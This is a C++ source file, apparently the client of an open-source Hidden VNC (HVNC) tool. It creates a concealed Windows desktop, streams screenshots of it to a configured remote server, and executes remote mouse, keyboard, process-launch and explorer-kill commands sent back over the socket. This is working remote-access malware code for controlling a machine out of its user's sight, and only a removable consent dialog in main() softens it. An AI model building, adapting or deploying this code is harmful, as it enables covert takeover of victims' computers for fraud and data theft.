/*
 * This file is part of Hidden VNC implementation from github.com/ntdll0.
 *
 * Copyright (C) 2024 Andrej.sh, github.com/ntdll0
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <vector>
#include <Windows.h>
#include <string>
#include <thread>
#include <opencv2/opencv.hpp>
#include <mutex>
#include <condition_variable>
#include <queue>

#include "Configuration.h"
#include "Utility.h"

#pragma comment(lib, "ws2_32.lib")

template<typename T>
class SafeQueue {
private:
    std::queue<T> queue;
    std::mutex syncMutex; // Protect concurrent access
    std::condition_variable sync;

public:
    void Push(T value) {
        std::lock_guard<std::mutex> lock(syncMutex);
        queue.push(value);
        sync.notify_one();
    }

    T Pop() {
        std::unique_lock<std::mutex> lock(syncMutex);
        sync.wait(lock, [this]() { return !queue.empty(); });
        T value = queue.front();
        queue.pop();
        return value;
    }

    bool Empty() {
        std::lock_guard<std::mutex> lock(syncMutex);
        return queue.empty();
    }
};

// Checks the difference between new and previous MAT, used to reduce traffic
// as we don't have to send same or very similar image twice
BOOL Differ(const cv::Mat& mat1, const cv::Mat& mat2, double threshold = 0.00001) {
    cv::Mat dif;
    cv::absdiff(mat1, mat2, dif);
    cv::Scalar totalDif = cv::sum(dif);
    double totalPixels = mat1.rows * mat1.cols * mat1.channels();
    double percent = (totalDif[0] + totalDif[1] + totalDif[2]) / (255.0 * totalPixels);
    return percent > threshold;
}

void Capture(SafeQueue<cv::Mat>& queue, bool* stopSignal, HDESK hDesktop) {
    SetThreadDesktop(hDesktop); // We set desktop to virtual one in current thread context

    HDC screenDC = GetDC(NULL);
    HDC captureDC = CreateCompatibleDC(screenDC);

    RECT desktopRect;
    GetClientRect(GetDesktopWindow(), &desktopRect);
    int desktopWidth = GetSystemMetrics(SM_CXSCREEN);
    int desktopHeight = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP bitMap = CreateCompatibleBitmap(screenDC, desktopWidth, desktopHeight);
    SelectObject(captureDC, bitMap);

    UINT renderFlag = HVNC::Win8Higher() ? PW_RENDERFULLCONTENT : NULL;

    while (!*stopSignal) {
        std::this_thread::sleep_for(std::chrono::milliseconds(Config::processingSleep)); // Sleep in order not to blow up cpu
        FillRect(captureDC, &desktopRect, (HBRUSH)GetStockObject(BLACK_BRUSH));
        std::vector<std::pair<HWND, int>> deskWindows;
        EnumWindows(HVNC::EnumWindowsProc, reinterpret_cast<LPARAM>(&deskWindows));

        // Sort windows by their Z index
        std::stable_sort(deskWindows.begin(), deskWindows.end(),
            [](const std::pair<HWND, int>& w1, const std::pair<HWND, int>& w2) {
                return w1.second > w2.second;
            }
        );

        // Begin painting windows on bitmap
        for (const auto& windowInfo : deskWindows) {
            HWND hwnd = windowInfo.first;
            RECT windowRect;
            GetWindowRect(hwnd, &windowRect);
            bool isVisible = IsWindowVisible(hwnd);
            if (isVisible && IsWindow(hwnd)) {
                int x = windowRect.left - desktopRect.left;
                int y = windowRect.top - desktopRect.top;

                windowRect.left -= desktopRect.left;
                windowRect.right -= desktopRect.left;
                windowRect.top -= desktopRect.top;
                windowRect.bottom -= desktopRect.top;

                int windowWidth = windowRect.right - windowRect.left;
                int windowHeight = windowRect.bottom - windowRect.top;

                HDC windowDC = GetWindowDC(hwnd);
                HDC windowCaptureDC = CreateCompatibleDC(screenDC);
                HBITMAP windowBitMap = CreateCompatibleBitmap(screenDC, windowWidth, windowHeight);
                SelectObject(windowCaptureDC, windowBitMap);

                // Paint window to bitmap 
                PrintWindow(hwnd, windowCaptureDC, renderFlag);
                BitBlt(captureDC, x, y, windowWidth, windowHeight, windowCaptureDC, 0, 0, SRCCOPY);

                // Clean
                DeleteDC(windowCaptureDC);
                DeleteObject(windowBitMap);
                ReleaseDC(hwnd, windowDC);
            }
        }

        BITMAPINFO bi;
        bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bi.bmiHeader.biWidth = desktopWidth;
        bi.bmiHeader.biHeight = -desktopHeight;
        bi.bmiHeader.biPlanes = 1;
        bi.bmiHeader.biBitCount = 32;
        bi.bmiHeader.biCompression = BI_RGB;
        bi.bmiHeader.biSizeImage = 0;
        bi.bmiHeader.biXPelsPerMeter = 0;
        bi.bmiHeader.biYPelsPerMeter = 0;
        bi.bmiHeader.biClrUsed = 0;
        bi.bmiHeader.biClrImportant = 0;

        cv::Mat MAT(desktopHeight, desktopWidth, CV_8UC4);
        if (!GetDIBits(captureDC, bitMap, 0, desktopHeight, MAT.data, &bi, DIB_RGB_COLORS)) {
            DeleteObject(bitMap);
            DeleteDC(captureDC);
            ReleaseDC(NULL, screenDC);
            return;
        }
        int resultWidth = (desktopWidth / 100) * Config::qualityPercentage;
        int resultHeight = (desktopHeight / 100) * Config::qualityPercentage;
        cv::resize(MAT, MAT, cv::Size(resultWidth, resultHeight));
        queue.Push(MAT);
    }

    ReleaseDC(NULL, screenDC);
    DeleteDC(captureDC);
}

void Process(SafeQueue<cv::Mat>& queue, bool* stopSignal, SOCKET connectSocket) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    send(connectSocket, (char*)&screenWidth, 4, 0);
    send(connectSocket, (char*)&screenHeight, 4, 0);

    cv::Mat previous;

    while (!*stopSignal) {
        cv::Mat MAT = queue.Pop();

        if (previous.empty() || ((MAT.cols != previous.cols || MAT.rows != previous.rows) || Differ(MAT, previous, Config::differenceTreshold))) {
            previous = MAT.clone();

            // JPEG encode imge
            std::vector<UCHAR> jpegData;
            std::vector<int> params = { cv::IMWRITE_JPEG_QUALITY, Config::compressionPercentage };
            cv::imencode(".jpeg", MAT, jpegData, params);

            char* dataBuffer = reinterpret_cast<char*>(jpegData.data());
            int header = jpegData.size();
            send(connectSocket, (char*)&header, 4, 0); // Header (size of image)
            send(connectSocket, dataBuffer, jpegData.size(), 0);
        }
    }
}

void Receive(bool* stopSignal, SOCKET connectSocket, HDESK hDesktop) {
    SetThreadDesktop(hDesktop);

    char buffer[1024];
    std::string receivedCommand;
    int bytesReceived;

    while (!*stopSignal) {
        std::this_thread::sleep_for(std::chrono::milliseconds(Config::inputSleep));

        receivedCommand.clear();
        memset(buffer, 0, sizeof(buffer));
        bytesReceived = recv(connectSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0) {
            *stopSignal = true;
            break;
        }

        receivedCommand.append(buffer, bytesReceived);

        std::vector<std::string> listArgs;
        size_t pos = 0;
        std::string delimiter = "|";
        while ((pos = receivedCommand.find(delimiter)) != std::string::npos) {
            listArgs.push_back(receivedCommand.substr(0, pos));
            receivedCommand.erase(0, pos + delimiter.length());
        }

        listArgs.push_back(receivedCommand);
        if (listArgs.empty()) continue;

        enum commands {
            CMD_MOUSECLICK,
            CMD_KEYBOARD,
            CMD_STARTPROCESS,
            CMD_ENDEXPLORER,
            CMD_UPDATESETTINGS
        };

        try {
            int commandType = std::stoi(listArgs[0]);
            switch (commandType) {
            case CMD_MOUSECLICK: {
                int argsInt[4];
                for (int i = 1; i < 5; ++i)
                    argsInt[i - 1] = std::stoi(listArgs[i]);
                HVNC::MouseClick(argsInt[0], argsInt[1], argsInt[2], argsInt[3]);
                break;
            }
            case CMD_KEYBOARD: {
                int argsInt[2];
                for (int i = 1; i < 3; ++i)
                    argsInt[i - 1] = std::stoi(listArgs[i]);
                HVNC::Key(argsInt[0], argsInt[1]);
                break;
            }
            case CMD_STARTPROCESS: {
                if (Config::enableDebug)
                    std::cout << "Starting up new process - " << listArgs[1] << std::endl;
                PROCESS_INFORMATION pi;
                STARTUPINFOA si;

                ZeroMemory(&si, sizeof(si));
                ZeroMemory(&pi, sizeof(pi));
                si.cb = sizeof(si);
                char desktopName[] = VIRTUAL_DESKTOP;
                si.lpDesktop = desktopName;
                CreateProcessA(NULL, const_cast<char*>(listArgs[1].c_str()), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
                break;
            }
            case CMD_ENDEXPLORER: {
                // Windows 11 explorer is quite a mess and consists of multiple windows & overlay
                // This makes it not possible to close with our mouse click implementation as we would always hit only the overlay window
                // I have included this function to make it easier to get rid of the explorer window without focusing on it in-depth
                HWND explorerWindow = FindWindowA("CabinetWClass", 0);
                if (explorerWindow != NULL) {
                    DWORD pid;
                    GetWindowThreadProcessId(explorerWindow, &pid);
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    TerminateProcess(hProcess, 0);
                }
                break;
            }
            case CMD_UPDATESETTINGS: {
                int argsInt[5];
                for (int i = 1; i < 6; ++i)
                    argsInt[i - 1] = std::stoi(listArgs[i]);
                Config::qualityPercentage = argsInt[0];
                Config::compressionPercentage = argsInt[1];
                Config::inputSleep = argsInt[2];
                Config::processingSleep = argsInt[3];
                Config::enableDebug = argsInt[4];
                Config::differenceTreshold = std::stod(listArgs[6]);
                break;
            }
            }
        }
        catch (const std::exception& e) {
            if (Config::enableDebug)
                std::cout << e.what() << std::endl;
        }
    }

    closesocket(connectSocket);
}

BOOL processThread(bool* stopSignal) {
    SetProcessDPIAware(); // Fix other display size %

    // ---------------------- Socket initialization
    WSADATA wsaData;
    SOCKET connectSocket;
    struct addrinfo* result = NULL;
    struct addrinfo hints;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        if (Config::enableDebug)
            std::cout << "Could not initialize" << std::endl;
        WSACleanup();
        return 1;
    }

    // Setup hints
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve server addr & port
    int resultAddr = getaddrinfo(CONNECTION_IP, CONNECTION_PORT, &hints, &result);
    if (resultAddr != 0) {
        if (Config::enableDebug)
            std::cout << "Failed to get address " << resultAddr << std::endl;
        WSACleanup();
        freeaddrinfo(result);
        return 1;
    }

    // Create socket
    connectSocket = socket(result->ai_family, result->ai_socktype, 0);
    if (connectSocket == INVALID_SOCKET) {
        WSACleanup();
        freeaddrinfo(result);
        return 1;
    }

    // Connect
    if (connect(connectSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        closesocket(connectSocket);
        connectSocket = INVALID_SOCKET;
        WSACleanup();
        freeaddrinfo(result);
        return 1;
    }

    // Save original desktop in case we needed to switch back to it
    HDESK hOriginalDesktop = GetThreadDesktop(GetCurrentThreadId());
    if (hOriginalDesktop == NULL) {
        if (Config::enableDebug)
            std::cout << "Could not open original desktop" << std::endl;
        return FALSE;
    }



    // We run cmd on virtual desktop so its not just black after first start
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    // lpDesktop represents the workstation a process will use,
    // in windows each process have one, the main one is called just "Default"
    char lpDesktop[] = VIRTUAL_DESKTOP;
    si.lpDesktop = lpDesktop;

    ZeroMemory(&pi, sizeof(pi));
    char process[] = "cmd.exe";
    CreateProcessA(NULL, process, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);



    SafeQueue<cv::Mat> queue;

    HDESK hDesktop = OpenDesktopA(VIRTUAL_DESKTOP, NULL, FALSE, GENERIC_ALL);
    if (hDesktop == NULL) // If we can't find the desktop, we create one
        hDesktop = CreateDesktopA(VIRTUAL_DESKTOP, NULL, NULL, NULL, GENERIC_ALL, NULL);
    
    std::thread desktopCapture(Capture, std::ref(queue), stopSignal, hDesktop);
    std::thread vncHandler(Process, std::ref(queue), stopSignal, connectSocket);
    std::thread receive(Receive, stopSignal, connectSocket, hDesktop);
    desktopCapture.join();
    vncHandler.join();
    receive.join();
    // Clean
    closesocket(connectSocket);
    WSACleanup();
    freeaddrinfo(result);
    return TRUE;
}

int main() {
    // Prompt user before starting HVNC client
    int question = MessageBoxA(NULL, "This is a concept of HVNC implementation.\nRunning this could expose your computer to risk. Proceed to run?", "Confirmation", MB_YESNO | MB_ICONQUESTION);
    if (question != IDYES)
        return 0;

    bool stopSignal = false;
    std::thread(processThread, &stopSignal).detach();
    std::cout << "Press any key to stop." << std::endl;
    system("pause>nul");
    stopSignal = true;
    std::cout << "Press any key to exit." << std::endl;
    system("pause>nul");
}
